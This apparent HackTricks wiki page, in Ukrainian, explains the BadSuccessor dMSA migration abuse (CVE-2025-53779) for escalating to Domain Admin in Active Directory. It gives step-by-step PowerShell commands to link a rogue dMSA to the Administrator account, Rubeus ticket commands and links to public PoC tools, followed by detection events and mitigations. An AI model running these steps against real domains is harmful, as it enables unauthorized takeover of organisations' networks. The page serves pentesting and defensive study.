# BadSuccessor: Підвищення привілеїв через зловживання міграцією Delegated MSA

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Delegated Managed Service Accounts (**dMSA**) — це наступне покоління **gMSA**, що з’явилося у Windows Server 2025. Легітимний процес міграції дає адміністраторам змогу замінити *старий* обліковий запис (користувача, комп’ютера або служби) на dMSA зі збереженням дозволів. Цей процес доступний через командлети PowerShell, як-от `Start-ADServiceAccountMigration` і `Complete-ADServiceAccountMigration`, та використовує два LDAP-атрибути **об’єкта dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN-посилання* на обліковий запис, який замінюється (старий).
* **`msDS-DelegatedMSAState`**       – стан міграції (`0` = немає, `1` = у процесі, `2` = *завершено*).<sup>[[1]](#references)</sup>

Якщо зловмисник може створити **будь-який** dMSA в OU та безпосередньо змінити ці 2 атрибути, LSASS і KDC вважатимуть dMSA *наступником* пов’язаного облікового запису. Коли зловмисник згодом автентифікується як dMSA, **він отримує всі привілеї пов’язаного облікового запису** — аж до **Domain Admin**, якщо пов’язано обліковий запис Administrator.<sup>[[1]](#references)</sup>

У 2025 році Unit 42 назвала цю техніку **BadSuccessor**. Пізніше Microsoft присвоїла їй ідентифікатор **CVE-2025-53779** та випустила оновлення безпеки у **серпні 2025 року**. Ця техніка досі актуальна для середовищ Windows Server 2025 без виправлень і під час перевірки небезпечного делегування в OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

На пропатчених DC [двостороння міграція dMSA](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) усе ще може розкрити цільовий обліковий запис, якщо зловмисник також може змінювати його атрибути міграції. Цей варіант вужчий за початкову атаку на довільну ціль.

### Передумови атаки

1. Обліковий запис, якому *дозволено* створювати об’єкти всередині **організаційного підрозділу (OU)**, і який має принаймні один із таких дозволів:
   * `Create Child` → клас об’єктів **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (загальний дозвіл на створення)
2. Мережеве з’єднання з LDAP і Kerberos (стандартний сценарій із приєднанням до домену / віддалена атака).<sup>[[1]](#references)</sup>

## Виявлення вразливих OU

Unit 42 опублікувала допоміжний скрипт PowerShell, який аналізує дескриптори безпеки кожного OU та позначає потрібні ACE:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Під капотом скрипт виконує сторінковий LDAP-пошук за `(objectClass=organizationalUnit)` і перевіряє кожен `nTSecurityDescriptor` на наявність

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (клас об’єкта *msDS-DelegatedManagedServiceAccount*)

## Етапи експлуатації

Щойно виявлено OU із правом запису, для атаки достатньо виконати лише 3 LDAP-записи:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Після реплікації зловмисник може просто виконати **logon** як `attacker_dMSA$` або запросити Kerberos TGT — Windows сформує токен *витісненого* облікового запису.<sup>[[1]](#references)</sup>

### Автоматизація

Кілька публічних PoC охоплюють увесь робочий процес, зокрема отримання пароля та керування квитками:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Модуль NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Виявлення та пошук

Увімкніть **аудит об’єктів** для OU та відстежуйте такі події безпеки Windows:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – створення об’єкта **dMSA**
* **5136** – зміна **`msDS-ManagedAccountPrecededByLink`**
* **4662** – зміни певних атрибутів
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – видача TGT для dMSA

Кореляція `4662` (зміна атрибута), `4741` (створення комп’ютерного облікового запису або облікового запису служби) та `4624` (подальший вхід до системи) дає змогу швидко виявляти активність BadSuccessor. Рішення XDR, як-от **XSIAM**, постачаються з готовими до використання запитами (див. посилання).<sup>[[2]](#references)</sup>

## Пом’якшення наслідків

* Установіть оновлення безпеки Microsoft для **CVE-2025-53779** і перевірте рівень оновлення кожного контролера домену Windows Server 2025.<sup>[[6]](#references)</sup>
* Дотримуйтеся принципу **найменших привілеїв** – делегуйте керування *обліковими записами служб* лише довіреним ролям.
* Вилучіть `Create Child` / `msDS-DelegatedManagedServiceAccount` з OU, де ця можливість не потрібна.
* Відстежуйте перелічені вище ідентифікатори подій і створюйте сповіщення, коли ідентичності *не рівня Tier 0* створюють або змінюють dMSA.

## Див. також


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: зловживання dMSA для підвищення привілеїв в Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – коли хороші облікові записи стають поганими: експлуатація делегованих керованих облікових записів служб](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [PoC SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – колекція інструментів для pentest](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Модуль BadSuccessor для NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Центр реагування на інциденти безпеки Microsoft – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
